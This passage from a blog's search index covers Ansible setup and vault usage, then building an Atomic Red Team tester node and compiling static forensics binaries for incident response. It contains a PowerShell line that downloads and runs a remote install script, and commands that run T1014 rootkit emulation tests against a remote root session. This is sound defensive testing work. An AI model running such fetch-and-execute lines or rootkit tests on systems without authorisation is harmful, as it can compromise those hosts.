'1'\n          ANSIBLE_FORCE_COLOR: '1'\n</code></pre>"},{"location":"blog/2023/08/20/simple-ansible-ansible/","title":"Ansible","text":"<p>Getting started with Ansible. If you don't know what Ansible is or what it's used for:</p> <p>What is Ansible?</p> <p>Ansible is a radically simple IT automation platform that makes your applications and systems easier to deploy and maintain. Automate everything from code deployment to network configuration to cloud management, in a language that approaches plain English, using SSH, with no agents to install on remote systems. https://docs.ansible.com.</p> <p>About this Post</p> <p>This post is a mirror of straysheep-dev/ansible-configs's README. It's being added here as both, a searchable reference within this mkdocs site, and because the recent post on Molecule needed to be split off into it's own post due to the amount of examples and details. This may end up being the primary source to maintain these notes going forward, with the ansible-configs project README linking back to this post.</p> <p>Resources</p> <ul> <li>https://github.com/ansible/ansible</li> <li>https://docs.ansible.com/ansible/latest/index.html</li> </ul>"},{"location":"blog/2023/08/20/simple-ansible-ansible/#example-project-ansible-configs","title":"Example Project: ansible-configs","text":"<p>The ansible-conifgs project is a monorepo of every Ansible role I've created or forked for my own use. Since this post was originally just the README for that project, you can use it to follow along below and get started in a test VM to learn about Ansible. The only reason this might be useful to anyone getting started is because when the monorepo was created, I was also just getting started. A lot of the notes here and roles were created from that perspective.</p> <p>ansible-conifgs</p> <p>A collection of ansible roles.</p> <p>This repo is both a set of various roles to mirror my own bash scripts, and my notes on using Ansible for easy reference.</p> <p>It's structured to be easy to clone, modify, and run only the roles you need. In most cases all you need to change is:</p> <ul> <li><code>playbook.yml</code>'s roles</li> <li>Your preferred <code>inventory/</code> file's hosts + users</li> </ul> <p>Use whichever inventory format works best for you. The <code>.ini</code> files allow specifying users as inline variables per host, which is useful if each host in a group has different users you'll be connecting as.</p> <p>Each inventory example connects to the ansible controller (the localhost of the machine you're running ansible from) by default. Modify these files to add your own remote connections.</p> <p>When you're done, run the playbook with one of the following:</p> <pre><code># For using sudo on the remote host, where you aren't using the root account\nansible-playbook -i inventory/inventory.ini [-b] --ask-become-pass -v playbook.yml\n\n# For using the root account on the remote host, typically to deploy and provision cloud resources\nansible-playbook -i inventory/inventory.ini -v playbook.yml\n</code></pre> <ul> <li><code>-b</code> will automatically elevate all tasks so you don't need to specify \"become sudo\" across every task (don't do this unless you need to)</li> <li><code>--ask-become-pass</code> takes the sudo password for the remote user</li> <li><code>-v</code> will show a useful amount of information without being too verbose</li> </ul> <p>To do: how to specify each remote user's password (if there are multiple remote users listed, each with a unique password).</p>"},{"location":"blog/2023/08/20/simple-ansible-ansible/#setup","title":"Setup","text":"<p>Install Ansible:</p> <ul> <li>Install Ansible via pipx</li> <li>pipx: Install</li> <li>Install Ansible via pip</li> <li>Ensure pip, setuptools, wheel are up to date</li> <li>Install pip on Debian/Ubuntu</li> </ul>"},{"location":"blog/2023/08/20/simple-ansible-ansible/#ubuntu-2310-fedora","title":"Ubuntu 23.10+, Fedora:","text":"<p>It's recommended to use <code>pipx</code>.</p> <pre><code># Ubuntu\nsudo apt update\nsudo apt install pipx\n\n# Fedora\nsudo dnf install pipx\n\npipx ensurepath\nsudo pipx ensurepath --global # optional to allow pipx actions with --global argument\n</code></pre> <p>Install Ansible using pipx:</p> <pre><code>pipx install --include-deps ansible\n</code></pre> <p>Inject additional libraries with pipx, like <code>passlib</code> to generate Unix password hashes:</p> <pre><code>pipx inject ansible passlib\n</code></pre> <p>Upgrade Ansible:</p> <pre><code>pipx upgrade --include-injected ansible\n</code></pre>"},{"location":"blog/2023/08/20/simple-ansible-ansible/#ubuntu-2204-and-older","title":"Ubuntu 22.04 and Older","text":"<p>If you're missing <code>pip</code>, the recommended way to install it on Ubuntu, or other Debian derivitives is through apt (Ansible's documentation also mentions the <code>python3-pip</code> package):</p> <pre><code>sudo apt update\nsudo apt install python3-pip\n</code></pre> <p>Install Ansible using pip:</p> <pre><code>python3 -m pip install --user ansible\n</code></pre> <p>Upgrade Ansible:</p> <pre><code>python3 -m pip install --upgrade --user ansible\n</code></pre>"},{"location":"blog/2023/08/20/simple-ansible-ansible/#install-multiple-versions","title":"Install Multiple Versions","text":"<p>See: Ansible Community Changelogs</p> <p>Using pipx you can install multiple versions of packages side by side. This is useful when you want the latest version of a package, and also a specific version of a package on the same system for testing.</p> <p>To install all of the <code>ansible-</code> tools, you need to specify <code>ansible-core</code>.</p> <pre><code>version_number=\"1.2.3\"\npackage_name='ansible-lint' # or ansible-core\npipx install --suffix=_\"$version_number\" \"$package_name\"==\"$version_number\"\n</code></pre> <p>Call the version-pinned installation using the suffix:</p> <pre><code>ansible-lint_1.2.3 --version # If installing ansible-lint==1.2.3\nansible-playbook_1.2.3 --version  # If installing ansible-core==1.2.3\n</code></pre> <p>Remove any versions you may have installed through <code>pipx</code> by following the steps above for testing:</p> <pre><code>version_number=\"2.12.10\"\npackage_name='ansible-core' # or ansible-core\npipx uninstall \"$package_name\"_\"$version_number\"\n</code></pre>"},{"location":"blog/2023/08/20/simple-ansible-ansible/#older-systems","title":"Older Systems","text":"<p>The latest versions of Ansible will not execute on systems with older versions of python3 installed. You will see an error similar to this, where it isn't even able to print the required version information:</p> <pre><code>fatal: [10.10.10.55]: FAILED! =&gt; {\"ansible_facts\": {}, \"changed\": false, \"failed_modules\": {\"ansible.legacy.setup\": {\"ansible_facts\": {\"discovered_interpreter_python\": \"/usr/bin/python3\"}, \"exception\": \"Traceback (most recent call last):\n\n&lt;SNIP&gt;\n\n  File \\\"/tmp/ansible_ansible.legacy.setup_payload_zlebszdb/ansible_ansible.legacy.setup_payload.zip/ansible/module_utils/basic.py\\\", line 17\n    msg=f\\\"ansible-core requires a minimum of Python version {'.'.join(map(str, _PY_MIN))}. Current version: {''.join(sys.version.splitlines())}\\\",\n</code></pre> <p>Ansible 2.13.0</p> <p>The versions found to be the most successful for these use cases are Ansible 2.13.0 or above.</p>"},{"location":"blog/2023/08/20/simple-ansible-ansible/#better-cli-output","title":"Better CLI Output","text":"<p>By default, Ansible will write output from playbooks and tasks without newlines interpretted. This makes reading playbooks executed with <code>-v</code> difficult.</p> <ul> <li>jeffgeerling.com: Ansible YAML Callback Plugin for a Better CLI Experience</li> <li>Ansible: Setting a Callback Plugin</li> <li><code>ansible-doc -t callback -l</code></li> <li>Ansible: ansible.builtin.default Now Supports YAML</li> <li>Ansible: ansible.builtin.default <code>result_format</code> Options</li> </ul> <p>You can list all of the built-in (or available) callbacks with <code>ansible-doc -t callback -l</code>, then print similar examples to what's available on Anisble's online documentation with something like <code>ansible-doc -t callback ansible.builtin.default</code>.</p> <p>Not all of these callbacks are specifically for affecting stderr and stdout. You'll want to review callbacks that seem interesting and check for options or environment variables that can be applied.</p> <p>ansible.cfg Search Order Priority</p> <p>ansible.cfg file search order priority:</p> <ul> <li><code>ANSIBLE_CONFIG</code> (environment variable if set)</li> <li><code>ansible.cfg</code> (in the current directory)</li> <li><code>~/.ansible.cfg</code> (in the home directory)</li> <li><code>/etc/ansible/ansible.cfg</code></li> </ul> <p>You can set just one option in your environment, and Ansible will still use the defaults or whatever is in your <code>ansible.cfg</code> file, for everything else.</p> <p>To simply have more human-readable CLI output, use the YAML <code>result_format</code>:</p> <pre><code>export ANSIBLE_CALLBACK_RESULT_FORMAT='yaml'\n# Now execute a playbook in the same shell environment\n</code></pre>"},{"location":"blog/2023/08/20/simple-ansible-ansible/#quick-start-testing-plays","title":"Quick Start: Testing Plays","text":"<p>Creating a playbook</p> <p>Use this yaml block as a copy-and-paste starting point when developing and testing plays on a single machine \"locally\" with ansible installed.</p> <p>This is useful to run only certain parts of a playbook or isolate certain tasks to debug them.</p> <pre><code># Write as: playbook.yml\n# Run with: ansible-playbook ./playbook.yml\n# https://docs.ansible.com/ansible/latest/getting_started/get_started_playbook.html\n# https://docs.ansible.com/ansible/latest/inventory_guide/connection_details.html#running-against-localhost\n# https://docs.ansible.com/ansible/latest/collections/ansible/builtin/debug_module.html\n- name: Debug Playbook\n  hosts: localhost\n  connection: local\n  vars:\n    user_defined_var: True\n  tasks:\n    - name: Prints message only if user_defined_var variable is set to True\n      ansible.builtin.debug:\n        msg: \"User defined variable set to: {{ user_defined_var }}\"\n      when: user_defined_var == True\n    - name: Ping localhost\n      ansible.builtin.ping:\n</code></pre>"},{"location":"blog/2023/08/20/simple-ansible-ansible/#how-ansible-works","title":"How Ansible Works","text":"<p>It's important to remember, for example, the <code>ansible.builtin.copy</code> module copies files from the control node to managed nodes, unless <code>remote_src: yes</code> is set.</p> <p>If <code>remote_src: yes</code> is set, <code>ansible.builtin.copy</code> will only use source paths on the remote host and not the control node.</p> <p>Basically, all tasks are typically executed on remote targets. This means using <code>ansible.builtin.find</code> + registering a variable + <code>ansible.builtin.copy</code>, to copy arbitrary files from the control node won't work.</p> <p>In that case, <code>ansible.builtin.find</code> will execute on the remote host, and not find the files. <code>ansible.builtin.copy</code> will attempt to use source paths on the remote host that don't exist instead of paths on the control node, causing this operation to fail.</p>"},{"location":"blog/2023/08/20/simple-ansible-ansible/#variables-and-inventories","title":"Variables and Inventories","text":"<p>Currently, most roles in this repo have variables defined in <code>vars/main.yml</code>. This file takes precedence in most cases. Using <code>defaults/main.yml</code> for variables instead allows you to define the default there, and override those defaults in your inventory file(s) on a per-host or per-group level. This note will be removed and changed when all current roles are revised to reflect this.</p> <p>Example default value for a variable in <code>defaults/main.yml</code>:</p> <pre><code>some_var: \"false\"\n</code></pre> <p>Ansible has modular ways of approaching and maintaining both, variables and an inventory at the same time.</p> <ul> <li>Assign variables per-machine</li> <li>Assign variables to machine groups</li> </ul> <p>Change <code>some_var</code> to <code>\"true\"</code> for just one host in your inventory:</p> <pre><code>10.0.0.40:22 ansible_user=user some_var=\"true\"\n</code></pre> <p>Change <code>some_var</code> to <code>\"true\"</code> for all hosts in a specific inventory group:</p> <pre><code>[remotegroup]\n10.0.0.41:22 ansible_user=user\n10.0.0.42:22 ansible_user=user\n10.0.0.43:22 ansible_user=user\n\n[remotegroup:vars]\nsome_var=\"true\"\n</code></pre> <p>Finally, be sure your <code>playbook.yml</code> file allows for either <code>all</code> groups, or the groups defined in your inventory file(s). If using <code>all</code>, you must ensure each inventory file has unique definitions to avoid collisions.</p> <pre><code>- name: \"Default Playbook\"\n  hosts:\n    # List groups from your inventory here\n    # You could also use the built in \"all\" or \"ungrouped\"\n    # \"all\" is necessary when Vagrant is auto-generating the inventory\n    all\n    #localgroup\n    #remotegroup\n    #tester_nodes\n    #target_nodes\n  roles:\n  &lt;SNIP&gt;\n</code></pre> <p>See the following reference:</p> <ul> <li>Playbook Variables: Tips on where to set variables</li> </ul>"},{"location":"blog/2023/08/20/simple-ansible-ansible/#windows-provisioning","title":"Windows Provisioning","text":"<p>You effectively have two options for opening Windows endpoints to Ansible provisioning:</p> <ul> <li>WinRM (Domain-Joined, ideally with Kerberos auth, otherwise there's a less secure work around)</li> <li>SSH (Best for non-domain-joined endpoints)</li> </ul> <p>There's also PSRemoting over SSH, available to Windows, Linux, and macOS. The PowerShell version installed must be 7.X or later.</p> <p>Update your <code>inventory.ini</code> file by appending the following options to your Windows endpoints:</p> <ul> <li><code>cmd</code> is the default shell for SSH on Windows</li> <li>Change this to <code>powershell</code> if you've defined PowerShell as the default SSH login shell</li> <li><code>ansible_become_user</code> is better to be specified per host in the inventory file</li> <li><code>ansible_become_password</code> may be necessary (with LAPS), use an ansible-vault to store these values</li> <li><code>ansible_become_method: runas</code> can be specified per task just like <code>sudo</code></li> </ul> <pre><code>[remotehosts]\n# \"Minimum\" possible settings, if tasks specify `become_method: runas`\n10.55.55.30:22 ansible_user=User ansible_become_user=User ansible_connection=ssh ansible_shell_type=cmd\n\n# Additional settings for password, and become_method\n10.55.55.31:22 ansible_user=User ansible_become_user=User ansible_become_password='{{ User_runas_pass }}' ansible_connection=ssh ansible_shell_type=cmd ansible_become_method=runas\n</code></pre> <p>Your tasks will have to reflect these kinds of settings as well, using <code>runas</code> instead of <code>sudo</code> when Windows is detected.</p> <p>See the following references:</p> <ul> <li>Ansible Privilege Escalation: <code>become</code> Connection Variables</li> <li>Ansible Playbook Fails on Windows</li> <li>Ansible Playbook Become Error</li> </ul> <p>Execute with:</p> <pre><code>~/.local/bin/ansible-playbook -i inventory.ini -v ./playbook.yml\n</code></pre>"},{"location":"blog/2023/08/20/simple-ansible-ansible/#ansible-vault","title":"Ansible-Vault","text":"<ul> <li>ansible-vault</li> <li>become-connection-variables</li> <li>playbooks-vault</li> </ul> <p>This utility is included with <code>ansible</code>, and allows you to create encyrpted ansible <code>.yml</code> files. It's primarily used for encrypting secrets used for plays, but can even be used to encrypt an entire role.</p> <p>Create an encrypted file (called a vault): <pre><code>ansible-vault create vault.yml\n# Enter a password, then edit / write the file in the default text editor (vim)\n</code></pre></p>"},{"location":"blog/2023/08/20/simple-ansible-ansible/#vault-password-file-environment-variables","title":"Vault Password File + Environment Variables","text":"<p>In cases where you're running multiple playbooks, it can be tedious to repeatedly enter the vault password. Ansible has a <code>--vault-pass-file</code> option that can read the password from a file. Unfortunately, Ansible doesn't have a built in environment variable you can pass to it for this purpose. Writing this secret in a plaintext file isn't the best idea, and interestingly enough you can specify commands or scripts as the vault-pass-file. This means you can use a similar trick to configuring terraform environment variables and read the vault password from an environment variable.</p> <p>See these references for a full breakdown, they're summarized below:</p> <ul> <li>Enter Vault Password Once for Multiple Playbooks</li> <li>How to Pass an Ansible Vault a Password</li> <li>Get Password from the Environment with <code>curl</code></li> <li>Get Password from Shell Script without Echoing</li> </ul> <p>First, enter the vault password with <code>read</code>:</p> <pre><code>echo \"Enter Vault Password\"; read -r -s vault_pass; export ANSIBLE_VAULT_PASSWORD=$vault_pass\n</code></pre> <ul> <li><code>-s</code> hides the text as you type</li> <li><code>-r</code> interprets any backslashes correctly, see SC2162</li> <li>The environment variable only appears in the <code>env</code> of that shell session</li> <li>It does not appear in the history of that shell</li> <li>Another shell running under the same user context cannot see that environment variable without a process dump</li> </ul> <p>Execute with:</p> <pre><code>ansible-playbook -i &lt;inventory&gt; -e \"@~/secrets/auth.yml\" --vault-pass-file &lt;(cat &lt;&lt;&lt;$ANSIBLE_VAULT_PASSWORD) -v ./playbook.yml\n</code></pre> <ul> <li>Uses <code>&lt;(cat &lt;&lt;&lt;$VARIABLE)</code> process substitution and creates a here-string</li> <li>The raw value will not appear in your process list</li> <li>Using pspy you can verify this</li> <li>Be sure <code>kernel.yama.ptrace_scope</code> is set to <code>1</code> or higher, as <code>0</code> will allow process dumping without root</li> </ul>"},{"location":"blog/2023/08/20/simple-ansible-ansible/#use-case-manage-remote-hosts-with-unique-sudo-passwords","title":"Use Case: Manage Remote Hosts with Unique Sudo Passwords","text":"<p>This covers the following scenario:</p> <ul> <li>You have two or more remote hosts with a normal user using <code>sudo</code> instead of root</li> <li>You need to update all of them weekly</li> <li>You do not want plain text passwords in yaml files</li> <li>Each remote host's <code>sudo</code> user has your ssh public key, and only accepts public key authentication</li> </ul> <p>A clear way to manage this and illustrate how this works is by creating a new vault file (we'll call it <code>auth.yml</code>) containing all of the remote user passwords.</p> <pre><code>ansible-vault create auth.yml\n# Specify a vault password, generate and save this to a password manager\n</code></pre> <p>The content of auth.yml could look like this:</p> <pre><code>admin_sudo_pass: 53Zbr3DPpfzGKSbWxNgWareBgNptKt5s\nsql_admin_sudo_pass: 3KYRoAndmF53XDu33No7jfsNv2jrrpLi\n</code></pre> <p>Then the contents of <code>inventory/inventory.ini</code> could look like this:</p> <pre><code>10.20.30.40:2222 ansible_user=admin ansible_become_password='{{ admin_sudo_pass }}'\n10.20.30.41:2222 ansible_user=sql_admin ansible_become_password='{{ sql_admin_sudo_pass }}'\n</code></pre> <p>To execute the playbook, specifying the <code>auth.yml</code> file with <code>-e \"@auth.yml\"</code>, and instead of <code>--ask-become-pass</code>, use <code>--ask-vault-pass</code>. Ansible will check the vaulted <code>auth.yml</code> file for the sudo passwords now instead of expecting them to be passed right after executing this command where typically it will only accept one input string for <code>become_pass</code>, which is the problem this solves.</p> <pre><code>ansible-playbook -i inventory/inventory.ini --ask-vault-pass --extra-vars \"@auth.yml\" -v playbook.yml\n</code></pre> <p>This can be taken further by also encrypting the usernames as variables in <code>auth.yml</code>.</p>"},{"location":"blog/2023/08/20/simple-ansible-ansible/#ansible-lint","title":"Ansible-Lint","text":"<p>For guidance on writing Ansible code, reference the Ansible Lint Documentation.</p> <p><code>ansible-lint</code> can be used on your playbooks, roles, or collections to check for common mistakes when writing ansible code.</p> <ul> <li>Installing <code>ansible-lint</code></li> <li>GitHub Action: run-ansible-lint</li> <li>GitHub Action: ansible-lint.yml Example</li> </ul> <p>There are a number of ways to do this, but you can install <code>ansible-lint</code> just like <code>ansible</code>.</p> <p>With <code>pipx</code>:</p> <pre><code>pipx install ansible-lint\n</code></pre> <p>With <code>pipx</code>, using a specific version:</p> <pre><code>version_number=\"1.2.3\"\npackage_name='ansible-lint'\npipx install --suffix=_\"$version_number\" \"$package_name\"==\"$version_number\"\n</code></pre> <p>With <code>pip</code>:</p> <pre><code>python3 -m pip install --user ansible-lint\n</code></pre> <ul> <li>Configuring ansible-lint</li> </ul> <p>The \"new\" way to do this, if you also intend to leverage the latest GitHub action in your CI/CD pipeline, is to use a configuration file to specify what <code>ansible-lint</code> should be checking. <code>ansible-lint</code> will look in the current directory, and then ascend directories, until getting to the git project root, looking for one of the following filenames:</p> <ul> <li><code>.ansible-lint</code>, this file lives in the project root</li> <li><code>.config/ansible-lint.yml</code>, this file exists within a <code>.config</code> folder</li> <li><code>.config/ansible-lint.yaml</code>, same as the previous file</li> </ul> <p>When using the <code>.config/</code> path, any paths specified in the <code>ansible-lint.yml</code> config file must have <code>../</code> prepended so ansible-lint can find them correctly.</p> <p>The easiest way to start, is with a profile, and excluding the <code>meta/</code> and <code>tests/</code> paths in roles. This is a less verbose version of the <code>.ansible-lint</code> file used in this repo.</p> <pre><code># .ansible-lint\n\n# Full list of configuration options:\n# https://ansible.readthedocs.io/projects/lint/configuring/\n\n# Profiles: null, min, basic, moderate, safety, shared, production\n# From left to right, the requirements to pass the profile checks become more strict.\n# Safety is a good starting point.\nprofile: safety\n\n# Shell globs are supported for exclude_paths:\n# - https://github.com/ansible/ansible-lint/pull/1425\n# - https://github.com/ansible/ansible-lint/discussions/1424\nexclude_paths:\n  - .cache/      # implicit unless exclude_paths is defined in config\n  - .git/        # always ignore\n  - .github/     # always ignore\n  - \"*/tests/\"   # ignore tests/ folder for all roles\n  - \"*/meta/\"    # ignore meta/ folder for all roles\n\n# These are checks that may often cause errors / failures.\n# If you need to make exceptions for any check, add it here.\nwarn_list:\n  - yaml[line-length]\n\n# Offline mode disables installation of requirements.yml and schema refreshing\noffline: true\n</code></pre> <p>Over time you may want to shift the profile to <code>shared</code> or <code>production</code>, and also tell <code>ansible-lint</code> to check the <code>tests/</code> and <code>meta/</code> paths for each role if you intend to publish them to ansible-galaxy.</p> <p>Errors</p> <p>Older versions of ansible-lint may produces errors that are difficult to diagnose. When this happens, use a very simple main.yml file, and start slowly adding tasks or vars to this file. Once you identify a task that creates an error, you can begin narrowing down which line(s) in the task or vars are producing the error.</p> <p>One example of this is new versions of ansible lint will want you to use <code>become_method: ansible.builtin.sudo</code>, while older versions require <code>become_method: sudo</code> and will generate a <code>schema[tasks]</code> error in this case.</p>"},{"location":"blog/2023/08/20/simple-ansible-ansible/#ansible-galaxy","title":"Ansible-Galaxy","text":"<p>This is the suggested way to share and run roles or collections. Though you can run them using local paths, you're meant to reference them using a fully-qualified-name (FQN in Ansible terms).</p> <ul> <li>Ansible-Galaxy</li> <li>Ansible-Galaxy User Guide (<code>ansible-galaxy</code>)</li> <li>Ansible-Galaxy User Guide (Platform and API)</li> <li>Create Ansible Roles or Collections</li> <li>Role Naming Conventions</li> </ul> <p>When creating roles that will be published, you'll need to fill out the <code>meta.yml</code> details:</p> <ul> <li>Role Meta: Supported Platforms (GH Issue: 52)</li> <li>Role Meta: Supported Platforms (<code>ansible-lint</code> schema)</li> </ul> <p>The documentation (at the time of writing) suggested making an <code>~/.ansible.cfg</code> to target the beta galaxy_ng server, however this is no longer working (in other words, the galaxy_ng server is no longer in beta and is now the default). It seems the best way to do this is by providing your API key on the command line, through an environment variable:</p> <pre><code>echo \"Enter Galaxy API Token\"; read -r -s ansible_galaxy_token; export ANSIBLE_GALAXY_TOKEN=$ansible_galaxy_token\n# [type or paste your key, it won't echo or show up in your bash history]\nansible-galaxy role import -vvv --token $ANSIBLE_GALAXY_TOKEN &lt;github-username&gt; &lt;ansible-role-my_repo&gt;\n</code></pre> <p>The above command will add (import) a role from your GitHub, to your own Ansible-Galaxy namespace, so that others can download and install it directly from the <code>ansible-galaxy</code> command.</p>"},{"location":"blog/2023/08/20/simple-ansible-ansible/#references","title":"References","text":"<p>This repo was inspired by, and created after learning from IppSec's parrot-build repo and video.</p>"},{"location":"blog/2024/07/12/octicons-beaker-16-atomic-red-team-x-unix-artifacts-collector/","title":"Atomic Red Team x Unix Artifacts Collector","text":"<p>An overview of spinning up a test environment, and extracting evidence from any unix-like endpoint. This is mostly for personal reference, as it's just pointing to all the existing (and vast) documentation in a sequence that's useful for me -- and hopefully for you as well.</p> <p>Deploy, Attack, Detect</p> <p>This covers topics in the following order:</p> <ul> <li>Creating a \"tester\" node used to execute atomics remotely towards \"target\" nodes.</li> <li>Connecting to targets via PSRemoting over SSH</li> <li>Compiling static binaries for <code>coreutils</code>, <code>binutils</code>, <code>chkrootkit</code>, <code>rkhunter</code>, and <code>yara</code> to use with <code>uac</code>.</li> <li>Collecting artifacts from \"target\" nodes.</li> <li>Sorting through artifacts</li> </ul> <p>In these tests, static binaries were compiled on an Ubuntu 22.04 server, and copied to an Ubuntu 20.04 server for use.</p> <p>Before getting started, you can follow the steps below or use any of the Ansible roles built while writing this post to deploy everything and refer to this post should you encounter any issues.</p> <p>Automate Deployment with Ansible</p> <p>Much of this has been automated with my Ansible roles:</p> <ul> <li>build_atomic_node: Deploy both a \"tester\" and \"targets\" using groups in your inventory file</li> <li>manage_keys: Deploy or revoke SSH private and public keys on endpoints</li> <li>deploy_uac: Drop UAC on each endpoint using groups in your inventory file</li> </ul>"},{"location":"blog/2024/07/12/octicons-beaker-16-atomic-red-team-x-unix-artifacts-collector/#install-invoke-atomicredteam","title":"Install Invoke-AtomicRedTeam","text":"<p>Invoke-AtomicReadTeam is an execution framework in PowerShell to run Atomic Tests, which are adversary emulation tests mapped to MITRE ATT&amp;CK.</p> <p>There are two clean and easy ways to do this.</p> <p>Windows Sandbox (Hyper-V)</p> <p>Basically all you need is the <code>.wsb</code> file, just execute it with PowerShell like: <code>PS&gt; .\\art.wsb</code> to start Windows Sandbox with Atomic Red Team provisioned.</p> <ul> <li>WSB Config File: Double-clicking the file or executing with PowerShell will spawn a Windows Sandbox instance.</li> <li>Setup Script: The WSB file executes PowerShell within the sandbox to retrieve this script and execute it, installing ART.</li> </ul> <p>Windows Sandbox: How Does It Work?</p> <p>Windows Sandbox is a temporary, Hyper-V-isolated environment. Any changes made here will not directly affect your host. Of course if you can ping your host's network interface from the Sanbox, be aware of exposure there. There's a setting called Protected Client mode, which (to my understanding) further isolates the RDP-like Sandbox process that runs on your \"host\" desktop environment through which you interact with the sandbox instance. Windows Sandbox itself is still running as it's own Hyper-V isolated environment separate from your host in either case. You may also want to adjust other settings in the wsb file, which are detailed here.</p> <p>Linux Server (terraform, vagrant, proxmox)</p> <p>This is the route I went. Using PowerShell on Linux for the examples below, and for better or worse you can run as root on the tester node for simplicity.</p> <ul> <li>Spin up a Linux server (locally with proxmox, vagrant, or in the cloud)</li> <li>Install PowerShell (using Ansible)</li> <li>Install the execution framework AND atomics folder</li> </ul> <p>In summary, once you're SSH'd into your Linux machine, start PowerShell and install Atomic Red Team with:</p> PowerShell <pre><code>pwsh  # Start PowerShell\nIEX (IWR 'https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicredteam.ps1' -UseBasicParsing);\nInstall-AtomicRedTeam -getAtomics -Force\n</code></pre>"},{"location":"blog/2024/07/12/octicons-beaker-16-atomic-red-team-x-unix-artifacts-collector/#provision-targets","title":"Provision Targets","text":"<p>On the \"target\" machines, the following changes must be made to allow PSRemoting over SSH.</p> <p>Linux</p> <p>This assumes sshd is already running and configured.</p> Bash <pre><code>echo 'Subsystem powershell sudo /usr/bin/pwsh -sshs -NoLogo' | sudo tee -a /etc/ssh/sshd_config\nsudo systemctl restart sshd\n</code></pre> <p>Windows:</p> <ul> <li>Install OpenSSH Server</li> <li>Install the latest version of PowerShell (7.X+) <code>winget install --id Microsoft.Powershell --source winget</code></li> <li>Confirm <code>SSHHost</code> and <code>SSHHostHashParam</code> are available with <code>(Get-Command New-PSSession).ParameterSets.Name</code></li> <li>Append the subsystem configuration to sshd_config</li> </ul> PowerShell <pre><code>echo 'Subsystem powershell c:/progra~1/powershell/7/pwsh.exe -sshs -nologo' | Out-File -Path $env:ProgramData\\ssh\\sshd_config -Encoding ASCII -Append\nRestart-Service sshd\n</code></pre> <p>With that, each endpoint is ready for executing atomic tests.</p>"},{"location":"blog/2024/07/12/octicons-beaker-16-atomic-red-team-x-unix-artifacts-collector/#running-tests","title":"Running Tests","text":"<p>The documentation for Invoke-AtomicTest is extensive, and you can browse individual tests per-OS in the wiki. I suggest walking through each section of the invoke-atomicredteam wiki first.</p> <ul> <li><code>-ShowDetailsBrief</code> will list the names of each test.</li> <li><code>-ShowDetails</code> is best used to learn more about a single technique.</li> <li><code>-CheckPrereqs</code> will see if the system has the components to execute the tests.</li> <li><code>-GetPrereqs</code> will attempt to obtain missing prerequisites, for example compiling the requires source code for the test.</li> <li>Executing Atomics Locally</li> <li>Executing Atomics Remotely</li> </ul> <p>The last item above is what we want to replicate. It links to the Microsoft documentation for enabling PSRemoting over SSH. By terraforming multiple cloud / proxmox servers, and installing PowerShell with Ansible, we're nearly done.</p> <p>From your atomic red team \"tester\" node, Import the module (on a Linux tester node):</p> PowerShell <pre><code>Import-Module \"/root/AtomicRedTeam/invoke-atomicredteam/Invoke-AtomicRedTeam.psd1\" -Force\n</code></pre> <p>Create an SSH key and distribute the public key to each target node.</p> Bash <pre><code>ssh-keygen -t ed25519 -f ~/.ssh/id_ed25519 -q -N \"\"\n\n# Append this to ~/.bashrc\nif [ -f $HOME/.ssh/id_ed25519 ]; then\n    eval $(ssh-agent -s)\n    ssh-add ~/.ssh/id_ed25519\nfi\n</code></pre> <p>Deploying Keys</p> <p>manage_keys can help do this.</p> <p>Open a PSRemoting Session from the tester node to the target node(s):</p> PowerShell <pre><code>$sess = New-PSSession -HostName &lt;target-ip&gt; -Username root -KeyFilePath ~/.ssh/id_ed25519\n</code></pre> <p>To execute all Linux rootkit tests againts the remote target:</p> PowerShell <pre><code>Invoke-AtomicTest T1014 -ShowDetailsBrief -Session $sess\nInvoke-AtomicTest T1014 -GetPrereqs -Session $sess\nInvoke-AtomicTest T1014 -CheckPrereqs -Session $sess\nInvoke-AtomicTest T1014 -Session $sess\n</code></pre> <p>This example focuses on techniques T1014-3 and T1014-4.</p> <p></p>"},{"location":"blog/2024/07/12/octicons-beaker-16-atomic-red-team-x-unix-artifacts-collector/#compiling-static-binaries","title":"Compiling Static Binaries","text":"<p><code>uac</code> will use any binaries in the following folder(s) instead of the system's binaries. This gives you the option to compile static binaries from a trusted host for use on a compromised system.</p> PowerShellBash <pre><code># [uac_directory]\\bin\\linux\\x86_64\\chkrootkit\nNew-Item -Path ~/uac/uac-$uac_version/bin/linux/x86_64 -Type Directory -Force\n</code></pre> <pre><code>mkdir -p ~/uac/uac-$uac_version/bin/linux/x86_64\n</code></pre> <p>Strategy and Reasoning</p> <p>The following five seem like the first candidates for static binaries to bring to a compromised system during IR:</p> <ul> <li>coreutils \u2705</li> <li>binutils \u26a0\ufe0f</li> <li>chkrootkit \u2705</li> <li>rkhunter \u2754</li> <li>yara \u2705</li> </ul> <p>Ideally you'd be doing this from a mounted forensic image of a system that's been taken offline. In this case we'll assume you have to do this on a live system currently under adversary control.</p>"},{"location":"blog/2024/07/12/octicons-beaker-16-atomic-red-team-x-unix-artifacts-collector/#prepare-environment","title":"Prepare Environment","text":"<p>Ubuntu</p> <p>Enable the source repositories, and install any missing development packages (this is based on my test with Ubuntu 22.04 server).</p> PowerShellBash <pre><code>New-Item -Path ~/src -Type Directory\nsudo sed -i_bkup 's/# deb-src/deb-src/g' /etc/apt/sources.list\nsudo apt update\n# Essentials\nsudo apt install -y make automake texinfo flex\n# For yara\nsudo apt install -y bison libtool pkg-config libprotobuf-c-dev libssl-dev\n</code></pre> <pre><code>mkdir ~/src\nsudo sed -i_bkup 's/# deb-src/deb-src/g' /etc/apt/sources.list\nsudo apt update\n# Essentials\nsudo apt install -y make automake texinfo flex\n# For yara\nsudo apt install -y bison libtool pkg-config libprotobuf-c-dev libssl-dev\n</code></pre> <p>Fedora</p> <p>\u26a0\ufe0f Although not completely covered in this post, this is useful to jump in with Fedora.</p> PowerShellBash <pre><code>New-Item -Path ~/src -Type Directory\nsudo dnf upgrade -y\nsudo dnf install -y make kernel-devel\n</code></pre> <pre><code>mkdir ~/src\nsudo dnf upgrade -y\nsudo dnf install -y make kernel-devel\n</code></pre> <p>Now we're ready to compile the source code.</p>"},{"location":"blog/2024/07/12/octicons-beaker-16-atomic-red-team-x-unix-artifacts-collector/#coreutils","title":"coreutils","text":"<p>This mailing list archive details how to build coreutils binaries statically. In my tests on an Ubuntu 22.04 server, the files contained within the already uncompressed <code>coreutils-8.32/</code> folder seem to have issues compiling. <code>rm -rf</code> removing this directory and extracting everything again from the source tar file yields better results.</p> PowerShell &amp; Bash <pre><code>cd ~/src\napt-get source coreutils\nrm -rf ~/src/coreutils-8.32\ncd ~/src\ntar -xvf ./coreutils_8.32.orig.tar.xz\ncd ./coreutils-8.32\n./configure 